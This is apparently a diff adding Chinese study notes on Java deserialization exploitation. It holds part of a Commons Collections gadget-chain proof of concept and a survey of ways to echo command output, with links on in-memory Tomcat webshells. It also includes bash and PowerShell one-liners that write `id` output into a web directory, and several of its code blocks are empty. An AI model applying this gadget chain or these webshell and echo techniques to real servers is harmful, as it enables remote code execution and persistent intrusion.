+                Field fd = ChainedTransformer.class.getDeclaredField("iTransformers");
+                fd.setAccessible(true);
+                fd.set(transformedChain, transformers);
+        
+                FileOutputStream f = new FileOutputStream("./test.txt");
+                ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流
+                out.writeObject(expMap);  //将我们构造的 AnnotationInvocationHandler类进行序列化
+                out.flush();
+                out.close();
+                //开始反序列化test.txt文件
+                Unser();
+            }
+        
+            public static void Unser() throws IOException,ClassNotFoundException{
+                FileInputStream in = new FileInputStream("./test.txt");   //实例化一个文件输入流
+                ObjectInputStream ins = new ObjectInputStream(in);      //实例化一个对象输入流
+                User u= (User) ins.readObject();   //反序列化
+                System.out.println("反序列化成功！");
+                ins.close();
+            }
+            class User {
+            }
+        }
+        
+        ```
+
+    - 
+
+### 反序列化漏洞回显与内存马：
+
+- 一般我们要想命令执行回显有以下几种方式
+    - **defineClass**
+    - **RMI绑定实例**
+    - **URLClassLoader抛出异常**
+    - **中间件**
+    - **写文件css、js**
+    - **dnslog**
+
+#### **defineClass异常回显**
+
+- 先说defineClass这个东西是因为下面的几种方式都是在其基础上进行改进。defineClass归属于ClassLoader类，其主要作用就是使用编译好的字节码就可以定义一个类。
+
+- 我们定义的
+
+- ```
+    
+    
+    ```
+
+- ```
+    
+    ```
+
+- 
+
+#### RMI绑定实例
+
+- 使用commons-collection反射调用defineClass，通过defineClass定义的恶意命令执行字节码来绑定RMI实例，接着通过RMI调用绑定的实例拿到回显结果
+
+#### URLClassLoader抛出异常
+
+- 通过将回显结果封装到异常信息抛出拿到回显。
+
+#### 中间件回显
+
+中间件而言多数重写了thread类，在thread中保存了req和resp，可以通过获取当前线程，在resp中写入回显结果
+
+这种方法前几天在先知上有很多针对tomcat无回显的文章，为各位师傅的文章画一下时间线：
+
+1. [《基于内存 Webshell 的无文件攻击技术研究》](https://www.anquanke.com/post/id/198886) 主要应用于Spring
+2. [《linux下java反序列化通杀回显方法的低配版实现》](https://xz.aliyun.com/t/7307) 将回显结果写入文件操作符
+3. [《Tomcat中一种半通用回显方法》](https://xz.aliyun.com/t/7348) 将执行命令的结果存入tomcat的response返回 shiro无法回显
+4. [《基于tomcat的内存 Webshell 无文件攻击技术》](https://xz.aliyun.com/t/7388) 动态注册filter实现回显 shiro无法回显
+5. [《基于全局储存的新思路 | Tomcat的一种通用回显方法研究》](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3) 通过Thread.currentThread.getContextClassLoader() 拿到request、response回显 tomcat7中获取不到StandardContext
+6. [《tomcat不出网回显连续剧第六集》](https://xz.aliyun.com/t/7535) 直接从Register拿到process对应的req
+
+不再赘述了，具体实现文章都有了。值得一提的思路可能就是反序列化不仅仅可以回显，也可以配合反射和字节码动态注册servlet实现无内存webshell。
+
+在weblogic中也有resp回显，具体代码在 [《weblogic_2019_2725poc与回显构造》](https://xz.aliyun.com/t/5299) lufei师傅已经给出来了
+
+#### 写文件和dnslog
+
+- 通过搜索特殊文件路径直接写入web可访问的目录，要熟悉常用中间件容器的目录结构，比如在我web目录有一个特殊的test.html
+
+- linux用bash
+
+    - ```bash
+        // 进入test.html的根目录并执行id命令写入1.txt
+        cd $(find -name "test.html" -type f -exec dirname {} \; | sed 1q) && echo `id` > 1.txt
+        
+        ```
+
+- windows的powershell
+
+    - ```java
+        $file = Get-ChildItem -Path . -Filter test.html -recurse -ErrorAction SilentlyContinue;$f = -Join($file.DirectoryName,"/a.txt");echo 222 |Out-File $f
+        
+        ```
 
 ### 中间件反序列化漏洞：
 
